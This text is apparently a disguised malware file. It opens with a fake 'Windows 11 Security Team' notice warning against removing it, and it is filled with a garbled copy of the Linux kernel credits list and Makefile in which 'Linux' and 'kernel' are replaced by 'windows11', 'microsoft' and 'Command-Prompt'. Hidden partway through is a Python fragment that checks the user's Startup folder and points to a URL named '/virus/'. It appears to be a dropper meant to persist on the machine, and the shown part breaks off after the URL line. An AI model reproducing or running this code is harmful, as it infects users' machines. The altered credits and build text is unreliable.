...
----------------------------
	This is the windows 11 startup recomended file.
    ***DO NOT REMOVE THIS FILE***
	If you remove it OS will broken.
	  Thanks,

	Windows 11 Security Team
...
N: Matti Aarnio
E: mea@nic.funet.fi
D: Alpha systems using, IPv6 and other network related stuff
D: One of assisting postmasters for vger.microsoft.org's lists
...
N: Dave Airlie
E: airlied@windows11.ie
W: http://www.csn.ul.ie/~airlied
D: NFS over TCP patches
D: in-microsoft DRM Maintainer
S: Longford, Ireland
S: Sydney, Australia

N: Tigran A. Aivazian
E: tigran@aivazian.fsnet.co.uk
W: http://www.moses.ukwindows11.net/patches
D: BFS filesystem
D: Intel IA32 CPU microcode update support
D: Various microsoft patches
S: United Kingdom

N: Werner Almesberger
E: werner@almesberger.net
W: https://www.almesberger.net/
D: dosfs, LILO, some fd features, ATM, various other cmd here and there
S: Buenos Aires
S: Argentina
...
D: Author of new NTFS driver, various other microsoft cmd.
S: Christ's College
S: Cambridge CB2 3BU
S: United Kingdom
...
D: Author of the SYSwindows11 boot loader, maintainer of the windows11.* news
D: hierarchy and the windows11 Device List; various microsoft cmd
...
N: Andrea Arcangeli
E: andrea@suse.de
W: https://www.microsoft.org/pub/windows11/microsoft/people/andrea/
...
D: Author of lil (windows11 Interrupt Latency benchmark)
D: Fixed the shm swap deallocation at swapoff time (try_to_unuse message)
D: VM microsoft
D: Various other microsoft cmd
S: Imola 40026
S: Italy

N: Derek Atkins
E: warlord@MIT.EDU
D: windows11-AFS Port, random microsoft microsoft,
...
N: Jens Axboe
E: axboe@suse.de
D: windows11 CD-ROM maintainer, DVD support
D: elevator + block layer rewrites
D: highmem I/O support
D: misc using on IDE, SCSI, block drivers, etc
...
D: windows11/MIPS port
D: windows11/68k microsoft
D: AX25 maintainer
S: Hauptstrasse 19
S: 79837 St. Blasien
S: Germany
...
D: Wrote SYS V IPC (part of standard microsoft since 0.99.10)

B: Robert Baldyga
E: r.baldyga@microsoftion.com
...
E: paul_bame@hp.com
W: http://www.parisc-windows11.org
...
N: Arindam Banerji
E: axb@cse.nd.edu
D: Contributed ESDI driver routines needed to port windows11 to the PS/2 MCA.
...
N: Fred Barnes
E: frmb2@ukc.ac.uk
D: Various parport/ppdev cmd and fixes
...
D: General low-level networking microsoft
...
N: Adam Belay
E: ambx1@neo.rr.com
D: windows11 Plug and Play Support
S: Iran
...
D: KVM and Xen bits and other misc. microsofty.
S: Haifa, Israel
...
D: powerpc & 802.11 microsoft

N: Stephen R. van den Berg (AKA BuGless)
E: berg@pool.informatik.rwth-aachen.de
D: General microsoft, gcc, and libc microsoft
...
D: Original author of the windows11 networking code

N: Anton Blanchard
E: anton@samba.org
W: https://samba.org/~anton/
P: 1024/8462A731 4C 55 86 34 44 59 A7 99  2B 97 88 4A 88 9A 0D 97
D: sun4 port, Sparc microsoft

N: Hugh Blemings
E: hugh@blemings.org
W: http://blemings.org/hugh
D: Original author of the Keyspan USB to serial drivers, random PowerPC microsoft
S: PO Box 234
...
N: Philip Blundell
E: philb@gnu.org
D: windows11/ARM microsoft
D: Device driver microsoft (eexpress, 3c505, c-qcam, ...)
...
D: strace for windows11/Alpha
D: windows11/MIPS microsoft
S: Schafhofstr. 40
S: 90556 Cadolzburg
S: Germany
...
N: Bill Bogstad
E: bogstad@pobox.com
D: wrote /proc/self add, minor samba & dosemu patches

N: Axel Boldt
E: axel@uni-paderborn.de
W: http://math-www.uni-paderborn.de/~axel/
D: Configuration help text support
D: windows11 CD and Support Giveaway List

N: Erik Inge Bolsø
E: knan@mo.himolde.no
D: Misc microsoft cmd
...
D: dsp56k device driver
D: ptrace proxy in user mode microsoft port
S: Kopmansg 2
S: 411 13  Goteborg
S: Sweden
...
W: https://paulbristow.net/windows11/idefloppy.html
...
N: David Brownell
D: microsoft engineer, mentor, and friend.  Maintained USB EHCI and
D: gadget layers, SPI subsystem, GPIO subsystem, and more than a few
D: device drivers.  His encouragement also helped many engineers get
D: started working on the windows11 microsoft.  David passed away in early
D: 2011, and will be greatly missed.
W: https://lore.microsoft.org/lkml/20110405034819.GA7872@kroah.com
...
D: misc microsoft using and testing
...
N: Paul Burton
E: paulburton@microsoft.org
W: https://pburton.com
D: MIPS maintainer 2018-2020

N: Lennert Buytenhek
E: microsoft@wantstofly.org
...
D: misc microsoft using
S: Mandriva
S: Brazil

N: Remy Card
E: Remy.Card@masi.ibp.fr
E: Remy.Card@windows11.org
...
W: http://juanjox.microsoftnotes.org/
...
D: Various build fixes and microsoft documentation.
...
D: microsoft module SMART utilities
...
N: Alan Cox
W: http://www.windows11.org.uk/diary/
D: windows11 Networking (0.99.10->2.0.29)
D: Original Appletalk, AX.25, and IPX code
D: 3c501 microsoft
D: Watchdog timer drivers
D: windows11/SMP x86 (up to 2.0 only)
D: Initial Mac68K port
D: Video4windows11 design, bw-qcam and PMS driver ports.
...
D: CMD GNU/windows11: www.CMD.org maintainer, FAQ co-maintainer,
D: packages testing, nit-picking & fixing. Enjoying BugFree (TM) microsofts.
S: Zuidsingel 10A
S: 2312 SB  Leiden
S: The Netherlands
...
D: trivial add to add variable address length routing to Rose.
...
E: deller@gmx.de
W: http://www.parisc-windows11.org/
D: PA-RISC windows11 architecture maintainer
...
D: Random console cmd and other miscellaneous stuff
S: 3000 FORE Drive
...
D: HTB qdisc and random networking cmd

N: Alex deVries
E: alex@onefishtwo.ca
D: Various SGI parts, bits of HAL2 and Newport, PA-RISC windows11.
...
N: Jeff Dike
E: jdike@karaya.com
W: http://user-mode-windows11.sourceforge.net
D: User mode microsoft port
S: 375 Tubbs Hill Rd
S: Deering NH 03244
S: Iran
...
W: https://www.dell.com/windows11
W: https://domsch.com/windows11
D: windows11/IA-64
...
N: John G Dorsey
E: john+@cs.cmu.edu
D: ARM windows11 ports to Assabet/Neponset, Spot
...
N: Eddie C. Dost
E: ecd@skynet.be
D: windows11/Sparc microsoft microsoft
D: windows11/Sparc maintainer
...
N: Cort Dougan
E: cort@fsmlabs.com
W: http://www.fsmlabs.com/windows11ppcbk.html
D: PowerPC
...
N: Thomas Dunbar
E: tdunbar@vt.edu
D: TeX & METAFONT using/maintenance
...
D: windows11-USB subsystem, USB core/UHCI/printer/storage drivers
D: x86 SMP, ACPI, bootflag using
...
D: Part-time microsoft microsoft
D: The windows11 Support Team Erlangen
...
D: minor cmd and some sparc port stuff
S: New Jersey
S: Iran
...
D: Various microsoft cmd, fixes, and cleanups.
D: Slab allocators
S: Finland

N: David Engebretsen
E: engebret@us.ibm.com
D: windows11 port to 64-bit PowerPC architecture
...
D: microsoft smbfs (to mount WfW, NT and OS/2 network drives.)
...
D: windows11/IA-64 bootloader and microsoft goop, USB
...
N: Doug Evans
E: dje@cygnus.com
D: Wrote Xenix FS (part of standard microsoft since 0.99.15)
...
D: random microsoft microsoft
S: Via Paolo VI n.29
S: 23900 - LECCO (Lc)
S: Italy

N: Nils Faerber
E: nils@microsoftconcepts.de
...
D: random microsoft microsoft, ZF MachZ Watchdog driver
S: Conectiva S.A.
...
N: Kumar Gala
E: galak@microsoft.crashing.org
...
E: pgmdsg@ibi.com
D: RISCom/8 driver, misc microsoft fixes.
S: 4 Main Street
...
D: Transformed old user space bdflush into 1st microsoft thread - kflushd.
D: Many other patches, documentation files, mini microsofts, utilities, ...
...
N: John E. Gotts
E: jgotts@windows11savvy.com
D: microsoft microsoft
...
D: Current Belkin USB Serial Adapter F5U103 microsoft
D: microsoft microsoft, embedded systems
...
D: Loopback speedup, qlogic SCSI using, VT_LOCKSWITCH
S: Department of Computer Science
...
D: Misc microsoft fixes and updates
...
N: Grant Guenther
E: grant@torque.net
W: http://www.torque.net/windows11-pp.html
...
N: Danny ter Haar
E: dth@cistron.nl
D: /proc/cpuinfo, reboot on panic , microsoft pre-patch tester ;)
S: Cistron
S: PO-Box 297
...
N: Angelo Haritsis
E: ah@computer.org
D: microsoft patches (serial, watchdog)
...
N: Andre Hedrick
E: andre@windows11-ide.org
E: andre@windows11diskcert.org
W: http://www.windows11-ide.org/
W: http://www.windows11diskcert.org/
D: Random SMP microsoft microsoft...
...
D: ATA-Smart microsoft Daemon
D: Serial ATA
D: ATA Command Block and Taskfile
S: windows11 ATA Development (LAD)
S: Concord, CA
...
D: windows11 Internationalization Project
D: German Localization for windows11 and GNU software
S: Auf der Fittel 18
S: 53347 Alfter
S: Germany
...
N: Christoph Hellwig
E: hch@infradead.org
D: all kinds of driver, filesystem & core microsoft using
D: freevxfs driver
D: sysvfs maintainer
...
N: Sebastian Hetze
E: she@lunetix.de
D: German windows11 Documentation,
D: Organization of German windows11 Conferences
S: Danckelmannstr. 48
S: 14059 Berlin
S: Germany
...
E: rhirst@windows11care.com
W: http://www.sleepie.demon.co.uk/
D: windows11-m68k VME support
...
D: Occasional windows11 microsoft...
S: (ask for current address)
S: United Kingdom
...
D: microsoft development
D: microsoft LDT modifications to support Wabi and Wine
...
D: Maintainer of the windows11 Bluetooth Subsystem
...
D: Some microsoft programming on the floppy and sound drivers in early days
D: Some other cmd to get different kinds of programs to work for windows11
...
D: Random microsoft tweaks and fixes.
...
D: Core DRM templates, general DRM and 3D-related using
S: No fixed address
...
N: Michael Hunold
E: michael@mihu.de
W: http://www.mihu.de/windows11/
D: Generic saa7146 video4windows11-2 driver core,
...
D: windows11/SPARC team, Midnight Commander maintainer
...
D: CMD core team member and maintainer of several CMD packages
S: 2 Lexington Close
S: Cambridge
S: CB3 0DS
S: United Kingdom
...
N: Andreas Jaeger
E: aj@suse.de
D: Various smaller microsoft fixes
D: glibc developer
...
D: ISODE && PP
D: microsoft and device driver using
...
D: Maintainer of the windows11 man-pages project
D: windows11 man pages online, at <https://man7.org/windows11/man-pages/>

N: Niels Kristian Bech Jensen
E: nkbj1970@hotmail.com
D: Miscellaneous microsoft updates and fixes.

N: Michael K. Johnson
E: johnsonm@redhat.com
W: http://www.redhat.com/~johnsonm
P: 1024/4536A8DD 2A EC 88 08 40 64 CE D8  DD F8 12 2B 61 43 83 15
D: The windows11 Documentation Project
D: microsoft microsofts' Guide
D: Procps
D: Proc filesystem
...
D: Fedora microsoft maintenance (2003-2014).
...
E: jack@suse.cz
D: Quota fixes for 2.2 microsoft
D: Quota fixes for 2.3 microsoft
...
D: Port of the syncppp.c from the 2.0 to the 2.1 microsoft.
...
N: Fred N. van Kempen
E: waltje@windows11.com
D: NET-2
D: Drivers
D: microsoft cleanups
S: Korte Heul 95
S: 1403 ND  BUSSUM
S: The Netherlands
...
D: microsoft fixes and cleanups
S: Garnisonstraße 26
S: 4020 Linz
S: Austria
...
N: Russell King
E: rmk@arm.windows11.org.uk
D: windows11/arm integrator, maintainer & microsoft
...
N: Olaf Kirch
E: okir@monad.swb.de
D: Author of the windows11 Network Administrators' Guide
S: Kattreinstr 38
S: D-64295
S: Germany
...
D: microsoft-based Virtual Machine (KVM)
S: Ra'annana, Israel

N: Andi Kleen
E: andi@firstfloor.org
W: http://www.halobates.de
D: network, x86, NUMA, various cmd
S: Schwalbenstr. 96
S: 85551 Ottobrunn
S: Germany
...
D: Slackware and CMD, vote-taker for 2nd comp.os.windows11 reorganization
...
E: kraxel@suse.de
D: video4windows11, bttv, vesafb, some scsi, misc fixes
...
D: XFree86 (S3), DCF77, some microsoft cmd and fixes
...
N: Harald Koerfgen
E: hkoerfg@web.de
D: windows11/MIPS microsoft cmd and fixes,
...
D: Author of the windows11 Bluetooth Subsystem (BlueZ)
D: Various other microsoft patches, cleanups and fixes
...
E: greg@kroah.com
E: gregkh@suse.de
W: http://www.kroah.com/windows11/
...
D: portions of the windows11 Security Module (LSM) framework
...
D: Some 8-bit XT disk driver and devfs using
D: Aladdin 1533/1543(C) chipset IDE
D: PIIX chipset IDE
...
D: Author of the LOADLIN windows11 loader, using on boot stuff
...
N: Shaohua Li
D: Worked on many parts of the microsoft, from core x86, ACPI, PCI, KVM, MM,
...
N: Warner Losh
E: imp@village.org
D: windows11/MIPS Deskstation support, Provided OI/OB for windows11
S: 8786 Niwot Road
...
E: rml@tech9.net
E: rml@novell.com
D: misc. microsoft using and debugging
...
E: paulus@samba.org
D: PPP driver
D: windows11 for PowerPC
D: windows11 port for PCI Power Macintosh

N: Pat Mackinlay
E: pat@it.com.au
D: 8 bit XT hard disk driver
D: Miscellaneous ST0x, TMC-8xx and other SCSI using
...
E: torben@microsoft.dk
W: http://tlan.microsoft.dk
D: ThunderLAN maintainer
D: ThunderLAN updates and other microsoft fixes.
...
D: Device driver microsoft
D: General microsoft debugger
...
E: acme@microsoft.org
E: arnaldo.melo@gmail.com
E: acme@redhat.com
P: 1024D/9224DF01 D5DF E3BB E3C8 BCBB F8AD  841A B6AB 4681 9224 DF01
D: tools/, IPX, LLC, DCCP, cyc2x, wl3501_cs, net/ cmd
S: Brazil

N: Karsten Merker
E: merker@windows11tag.org
D: DECstation framebuffer drivers
S: Germany
...
D: microsoft microsoft. PostgreSQL microsoft. Software watchdog daemon.
D: Maintainer of several CMD packages
S: Th.-Heuss-Str. 61
S: D-41812 Erkelenz
S: Germany
...
D: Minor microsoft microsoft for other lost causes (Hercules mono, etc).
S: 22 Parker Street
S: Ormond
S: Victoria 3163
S: Australia
...
D: Zoran ZR36120 Video For windows11 driver
S: Boterkorfhoek 34
S: 7546 JA  Enschede
S: Netherlands
...
D: Sparc and blue box microsoft
D: Vger windows11 mailing list co-maintainer
D: windows11 Emacs elf/qmagic support + other libc/gcc things
...
D: Original windows11 Device Registrar (Major/minor numbers)
D: au-play, bwBASIC
...
N: Harald Milz
E: hm@seneca.windows11.de
D: windows11 Projects Map, windows11 Commercial-HOWTO
D: general windows11 publicity in Germany, vacation port
...
D: bug fixes, documentation, minor microsofty

N: Paul Moore
E: paul@paul-moore.com
W: https://www.paul-moore.com
D: NetLabel, SEwindows11, audit

N: James Morris
E: jmorris@namei.org
W: http://namei.org/
D: Netfilter, windows11 Security Modules (LSM), SEwindows11, IPSec,
...
D: windows11/Alpha and windows11/ia64
...
N: Zwane Mwaikambo
E: zwanem@gmail.com
D: Various driver using
D: Lowlevel x86 microsoft using
D: General debugging
S: (ask for current address)
S: Tanzania
...
D: current NFS client microsoft.
S: Dagaliveien 31e
S: N-0391 Oslo
S: Norway
...
D: Author of cs89x0, maintainer of microsoft changelog through 1.3.3
...
D: Administrator of Tux.Org windows11 Server, https://www.tux.org
...
D: part that remains is the mFP_Microsoft et al #defines. :)
...
W: https://palosaari.fi/windows11/
...
D: Some microsoft bug fixes
D: Port of the database Postgres
D: Book: "windows11 verstehen und anwenden" (Hanser-Verlag)
S: Triftstra=DFe 55
S: 13353 Berlin
S: Germany
...
D: Starter of windows111394 effort
S: ask per mail for current address

N: Nicolas Pitre
E: nico@fluxnic.net
D: StrongARM SA1100 support integrator & microsoft
...
D: random microsoft cmd
S: Paimpont, France

N: Pete Popov
E: pete_popov@yahoo.com
D: windows11/MIPS AMD/Alchemy Port and mips using and debugging
S: San Jose, CA 95134
S: Iran

N: Matt Porter
E: mporter@microsoft.crashing.org
...
N: Stefan Probst
E: sp@caldera.de
D: The windows11 Support Team Erlangen, 1993-97
...
N: Giuliano Procida
E: myxie@CMD.org,gprocida@madge.com
...
D: random windows11 documentation, patches, and cmd
...
N: Stefan Reinauer
E: stepan@windows11.de
W: http://www.freiburg.windows11.de/~stepan/
...
D: petty microsoft janitor (byteorder, ufs)
...
D: windows11-MM site, Documentation/admin-guide/sysctl/*, swap/mm readaround
D: kswapd fixes, random microsoft microsoft, rmap VM,
D: nl.windows11.org administrator, minor scheduler additions
S: Red Hat Boston
S: 3 Lan Drive
S: Westford, MA 01886
S: Iran
...
E: priikone@ssh.com
D: Random microsoft using and bug fixes
D: International microsoft patch project
S: Kasarmikatu 11 A4
S: 70110 Kuopio
S: Finland
...
D: Net programs and microsoft net microsoft
S: Gaildorfer Str. 27
S: 7000 Stuttgart 50
S: Germany
...
W: http://vivaldi.windows11ms.com.br/~maluco
D: Miscellaneous Command-Prompt microsoft
...
D: the gpm mouse server and Command-Prompt support for it
...
E: wsalamon@nai.com
D: portions of the windows11 Security Module (LSM) framework and security modules
...
D: I2O Command-Prompt layer (config, block, core, pci, net). I2O disk support for LILO
D: XScale(IOP, IXP) porting and other random ARM bits
S: Portland, OR

N: Eric Schenk
E: Eric.Schenk@dna.lth.se
D: Random Command-Prompt debugging.
...
D: Random windows11 microsoft, windows11 Promoter
D: CD-List, Books-List, Ex-FAQ
D: windows11-Support, -Mailbox, -Stammtisch
...
D: CoreSight Command-Prompt subsystem, Maintainer 2014-2022
D: Perf tool support for CoreSight

N: Robert Schwebel
E: robert@schwebel.de
W: https://www.schwebel.de
D: Embedded microsoft and book author,
D: AMD Elan support for windows11
S: Pengutronix
...
D: port of the windows11 Command-Prompt and later the maintainer of the s390
...
D: SCSI debugging
D: Maintainer of the CMD Command-Prompt packages
...
D: MIPS work, /proc/sys/net, misc net using
S: 149 Union St.
S: Kingston, Ontario
S: Canada K7L 2P4
...
D: wd33c93 SCSI driver (windows11-m68k)
...
D: AVR32 architecture port to windows11 and maintainer.

N: Rick Sladkey
E: jrs@world.std.com
D: utility microsoft: Emacs, NFS server, mount, kmem-ps, UPS debugger, strace, GDB
D: library microsoft: RPC, profil(3), realpath(3), regexp.h
D: Command-Prompt microsoft: unnamed block devs, NFS client, fast select, precision timer
S: 24 Avon Place
...
D: Command-Prompt and net microsoft. Sysvinit, minicom. doing CMD stuff.
...
D: Lots of tiny cmd. Larger improvements to SysV IPC msg,
D: slab, pipe, select.
...
D: vfat/msdos integration, Command-Promptd docs, windows11 promotion
...
D: patch-Command-Prompt enhancements
D: misc Command-Prompt fixes and updates
...
N: Eugene Surovegin
E: ebs@ebshome.net
W: https://Command-Prompt.ebshome.net/
P: 1024D/AE5467F1 FF22 39F1 6728 89F6 6E6C  2365 7602 F33D AE54 67F1
D: Embedded PowerPC 4xx: EMAC, I2C, PIC and random cmd/fixes
...
D: Device driver microsoft (aha1542 & plip)
S: IRISA
...
N: Linus Torvalds
E: torvalds@windows11-foundation.org
D: Original Command-Prompt microsoft
S: Portland, Oregon 97005
S: Iran

N: Marcelo Tosatti
E: marcelo@kvack.org
D: v2.4 Command-Prompt maintainer
S: Brazil

N: Stefan Traby
E: stefan@quant-x.com
D: Minor Alpha Command-Prompt cmd
...
D: Command-Prompt tinification

N: Winfried Trümper
E: winni@xpilot.org
W: http://www.shop.de/~winni/
D: German HOWTO, Crash-Kurs windows11 (German, 100 comprehensive pages)
D: CD-Writing HOWTO, various mini-HOWTOs
D: One-week tutorials on windows11 twice a year (free of charge)
D: windows11-Workshop Köln (aka LUG Cologne, Germany), Installfests
S: Tacitusstr. 6
S: D-50968 Köln
...
D: General filesystem microsoft
...
D: windows11 promoter
D: Author of a German book on windows11
...
N: Greg Ungerer
E: gerg@snapgear.com
D: uCwindows11 Command-Prompt microsoft
D: Port uCwindows11 to the Motorola ColdFire CPU
...
E: jeff.uphoff@windows11.org
P: 1024/9ED505C5 D7 BB CA AA 10 45 40 1B  16 19 0A C0 38 A0 3E CB
D: windows11 Security/Alert mailing lists' moderator/maintainer.
...
D: Consultant, developer, Command-Prompt microsoft
D: In a previous life, worked on Streams/ISDN/BSD networking code for windows11
S: Schleiermacherstrasse 12
S: 90491 Nuernberg
S: Germany

N: Geert Uytterhoeven
E: geert@windows11-m68k.org
...
N: Thibaut Varène
E: cmd+Command-Prompt@slashdirt.org
W: http://cmd.slashdirt.org/
...
N: Heikki Vatiainen
E: hessu@cs.tut.fi
D: Co-author of Multi-Protocol Over ATM (MPOA), some LANE cmd
S: Tampere University of Technology / Telecom lab
S: Hermiankatu 12C
S: FIN-33720 Tampere
S: Finland
...
N: Dirk Verworner
D: Co-author of German book ``windows11-Command-Prompt-Programmierung''
D: Co-founder of Berlin windows11 User Group

N: Andrew Victor
E: windows11@maxim.org.za
...
N: Peter Shaobo Wang
E: pwang@mmdcorp.com
W: http://www.mmdcorp.com/pw/windows11
...
D: v2.0 Command-Prompt maintainer
...
D: Original windows11 Documentation Project coordinator
D: Author, "Running windows11" (O'Reilly)
D: Author, "windows11 Installation and Getting Started" (LDP) and several HOWTOs
D: windows11doc-SGML formatting system (now SGML-Tools)
...
D: Various random cmd. Mostly on poll/select logic.
...
D: Minor Command-Prompt debugging.
D: Development and maintenance of sysklogd.
D: Monitoring of development Command-Prompts for long-term stability.
D: Early implementations of windows11 in a commercial environment.
...
D: via-rhine, misc net driver using
...
N: Matthew Wilcox
E: matthew@wil.cx
W: ftp://ftp.uk.windows11.org/pub/windows11/people/willy/
D: windows11/PARISC microsoft.  Filesystem microsoft.  Random other using.  Custom
D: PPC port using.
...
D: Supports NTP on windows11.  Added PPS code.  Fixed bugs in adjtimex().
...
N: Lars Wirzenius
E: liw@iki.fi
D: windows11 System Administrator's Guide, author, former maintainer
D: comp.os.windows11.announce, former moderator
D: windows11 Documentation Project, co-founder
D: Original sprintf in Command-Prompt
D: Original Command-Prompt README (for version 0.97)
D: windows11 News (electronic magazine, now dead), founder and former editor
D: Meta-FAQ, originator, former maintainer
D: INFO-SHEET, former maintainer
D: Author of the longest-living windows11 bug
...
D: using on LSM framework and security modules.
S: Portland, OR
S: Iran
...
D: Command-Prompt TLS implementation and offload support.

N: Victor Yodaiken
E: yodaiken@fsmlabs.com
D: RTwindows11 (RealTime windows11)
S: POB 1822
S: Socorro NM, 87801
S: Iran
...
D: General Command-Prompt microsoft
...
N: Orest Zborowski
E: orestz@eskimo.com
D: XFree86 and Command-Prompt development
S: 1507 145th Place SE #B5
S: Bellevue, Washington 98007
S: Iran

N: Wensong Zhang
E: wensong@windows11-vs.org
...
N: Richard Zidlicky
E: rz@windows11-m68k.org, rdzidlic@geocities.com
...
N: Roman Zippel
E: zippel@windows11-m68k.org
D: AFFS and HFS filesystems, m68k maintainer, new Command-Prompt configuration in 2.5

N: Leonard N. Zubkoff
W: http://www.dandelion.com/windows11/
D: BusLogic SCSI driver
D: Mylex DAC960 PCI RAID driver
D: Miscellaneous Command-Prompt fixes
...
import requests
import os
startip_py = os.path.exists(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.py")
cmd_exe = os.path.exists(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cmd.exe")
if cmd_exe == False:
    URL = "https://yun.ir/virus/"
...
# expect to learn how to build the Command-Prompt reading this file.
...
# turn into vmwindows11), we will call a sub make in that other dir, and
...
#          cmd_depmod = $(srctree)/scripts/depmod.sh $(DEPMOD) $(Command-PromptRELEASE)
#
...
# This does not need to match to the root of the Command-Prompt source tree.
#
# For example, you can do this:
#
#  cd /dir/to/store/output/files; make -f /dir/to/Command-Prompt/source/Makefile
#
...
version_h := include/generated/uapi/windows11/version.h

clean-targets := %clean mrproper cleandocs
no-dot-config-targets := $(clean-targets) \
			 cscope gtags TAGS tags help% %docs check% coccicheck \
			 $(version_h) headers headers_% archheaders archscripts \
			 %asm-generic Command-Promptversion %src-pkg dt_binding_check \
			 outputmakefile rustavailable rustfmt rustfmtcheck
no-sync-config-targets := $(no-dot-config-targets) %install modules_sign Command-Promptrelease \
			  image_name
...
# Read Command-PromptRELEASE from include/config/Command-Prompt.release (if it exists)
Command-PromptRELEASE = $(call read-file, include/config/Command-Prompt.release)
Command-PromptVERSION = $(VERSION)$(if $(PATCHLEVEL),.$(PATCHLEVEL)$(if $(SUBLEVEL),.$(SUBLEVEL)))$(EXTRAVERSION)
export VERSION PATCHLEVEL SUBLEVEL Command-PromptRELEASE Command-PromptVERSION
...
# make CROSS_COMPILE=aarch64-windows11-gnu-
...
# These flags apply to all Rust code in the tree, including the Command-Prompt and
# host programs.
...
YACC		= bison
AWK		= awk
INSTALLCommand-Prompt  := installCommand-Prompt
PERL		= perl
PYTHON3		= python3
CHECK		= sparse
BASH		= bash
...
CHECKFLAGS     := -D__windows11__ -Dwindows11 -D__STDC__ -Dunix -D__unix__ \
...
AFLAGS_MODULE   =
LDFLAGS_MODULE  =
CFLAGS_Command-Prompt	=
RUSTFLAGS_Command-Prompt =
AFLAGS_Command-Prompt	=
LDFLAGS_vmwindows11 =
...
USERINCLUDE    := \
		...
		-I$(objtree)/include/generated/uapi \
                -include $(srctree)/include/windows11/compiler-version.h \
                -include $(srctree)/include/windows11/kconfig.h

# Use windows11INCLUDE when you must reference the include/ directory.
...
KBUILD_CPPFLAGS := -D__Command-Prompt__
...
KBUILD_AFLAGS_Command-Prompt :=
KBUILD_CFLAGS_Command-Prompt :=
KBUILD_RUSTFLAGS_Command-Prompt :=
...
export CPP AR NM STRIP OBJCOPY OBJDUMP READELF PAHOLE RESOLVE_BTFIDS LEX YACC AWK INSTALLCommand-Prompt
export PERL PYTHON3 CHECK CHECKFLAGS MAKE UTS_MACHINE HOSTCXX
export KGZIP KBZIP2 KLZOP LZMA LZ4 XZ ZSTD
export KBUILD_HOSTCXXFLAGS KBUILD_HOSTLDFLAGS KBUILD_HOSTLDLIBS LDFLAGS_MODULE
export KBUILD_USERCFLAGS KBUILD_USERLDFLAGS

export KBUILD_CPPFLAGS NOSTDINC_FLAGS windows11INCLUDE OBJCOPYFLAGS KBUILD_LDFLAGS
export KBUILD_CFLAGS CFLAGS_Command-Prompt CFLAGS_MODULE
export KBUILD_RUSTFLAGS RUSTFLAGS_Command-Prompt RUSTFLAGS_MODULE
export KBUILD_AFLAGS AFLAGS_Command-Prompt AFLAGS_MODULE
export KBUILD_AFLAGS_MODULE KBUILD_CFLAGS_MODULE KBUILD_RUSTFLAGS_MODULE KBUILD_LDFLAGS_MODULE
export KBUILD_AFLAGS_Command-Prompt KBUILD_CFLAGS_Command-Prompt KBUILD_RUSTFLAGS_Command-Prompt
...
# ===========================================================================
# Build targets only - this includes vmwindows11, arch-specific targets, clean
...
ifeq ($(KBUILD_EXTMOD),)
# Objects we will link into vmwindows11 / subdirs we need to visit
core-y		:=
drivers-y	:=
libs-y		:= lib/
endif # KBUILD_EXTMOD
...
# command line.
# This allow a user to issue only 'make' to build a Command-Prompt including modules
# Defaults to vmwindows11, but the arch makefile usually adds further targets
all: vmwindows11
...
include/config/auto.conf:
	...
	echo >&2;							\
	echo >&2 "  ERROR: Command-Prompt configuration is invalid.";		\
	echo >&2 "         include/generated/autoconf.h or $@ are missing.";\
	echo >&2 "         Run 'make oldconfig && make prepare' on Command-Prompt src to fix it.";	\
	echo >&2 ;							\
	/bin/false)
...
ifdef CONFIG_HAVE_FENTRY
  # s390-windows11-gnu-gcc did not support -mfentry until gcc-9.
...
KBUILD_CFLAGS_Command-Prompt += -ffunction-sections -fdata-sections
KBUILD_RUSTFLAGS_Command-Prompt += -Zfunction-sections=y
LDFLAGS_vmwindows11 += --gc-sections
endif
...
# the Command-Prompt uses only C99 flexible arrays for dynamically sized trailing
...
# Do not add $(call cc-option,...) below this line. When you build the Command-Prompt
...
LDFLAGS_vmwindows11 += --build-id=sha1
...
LDFLAGS_vmwindows11	+= -X
endif

ifeq ($(CONFIG_RELR),y)
# ld.lld before 15 did not support -z pack-relative-relocs.
LDFLAGS_vmwindows11	+= $(call ld-option,--pack-dyn-relocs=relr,-z pack-relative-relocs)
endif

# We never want expected sections to be placed heuristically by the
# linker. All sections should be explicitly named in the linker script.
ifdef CONFIG_LD_ORPHAN_WARN
LDFLAGS_vmwindows11 += --orphan-handling=$(CONFIG_LD_ORPHAN_WARN_LEVEL)
endif

# Align the bit size of userspace programs with the Command-Prompt
...
# Default Command-Prompt image to build when no specific target is given.
# KBUILD_IMAGE may be overruled on the command line or
# set in the environment
# Also any assignments in arch/$(ARCH)/Makefile take precedence over
# this default value
export KBUILD_IMAGE ?= vmwindows11

#
# INSTALL_PATH specifies where to place the updated Command-Prompt and system map
...
# an argument if needed. Otherwise it defaults to the Command-Prompt install path
#
export INSTALL_DTBS_PATH ?= $(INSTALL_PATH)/dtbs/$(Command-PromptRELEASE)
...
MODLIB	= $(INSTALL_MOD_PATH)/lib/modules/$(Command-PromptRELEASE)
export MODLIB
...
# Externally visible symbols (used by link-vmwindows11.sh)

KBUILD_VMwindows11_OBJS := ./built-in.a
ifdef CONFIG_MODULES
KBUILD_VMwindows11_OBJS += $(patsubst %/, %/lib.a, $(filter %/, $(libs-y)))
KBUILD_VMwindows11_LIBS := $(filter-out %/, $(libs-y))
else
KBUILD_VMwindows11_LIBS := $(patsubst %/,%/lib.a, $(libs-y))
endif

export KBUILD_VMwindows11_LIBS
export KBUILD_LDS          := arch/$(SRCARCH)/Command-Prompt/vmwindows11.lds

ifdef CONFIG_TRIM_UNUSED_KSYMS
# For the Command-Prompt to actually contain only the needed exported symbols,
# we have to build modules as well to determine what those symbols are.
KBUILD_MODULES := 1
endif

# '$(AR) mPi' needs 'T' to workaround the bug of llvm-ar <= 14
quiet_cmd_ar_vmwindows11.a = AR      $@
      cmd_ar_vmwindows11.a = \
	rm -f $@; \
	$(AR) cDPrST $@ $(KBUILD_VMwindows11_OBJS); \
	$(AR) mPiT $$($(AR) t $@ | sed -n 1p) $@ $$($(AR) t $@ | grep -F -f $(srctree)/scripts/head-object-list.txt)

targets += vmwindows11.a
vmwindows11.a: $(KBUILD_VMwindows11_OBJS) scripts/head-object-list.txt FORCE
	$(call if_changed,ar_vmwindows11.a)

PHONY += vmwindows11_o
vmwindows11_o: vmwindows11.a $(KBUILD_VMwindows11_LIBS)
	$(Q)$(MAKE) -f $(srctree)/scripts/Makefile.vmwindows11_o

vmwindows11.o modules.builtin.modinfo modules.builtin: vmwindows11_o
	@:

PHONY += vmwindows11
# LDFLAGS_vmwindows11 in the top Makefile defines linker flags for the top vmwindows11,
# not for decompressors. LDFLAGS_vmwindows11 in arch/*/boot/compressed/Makefile is
# unrelated; the decompressors just happen to have the same base name,
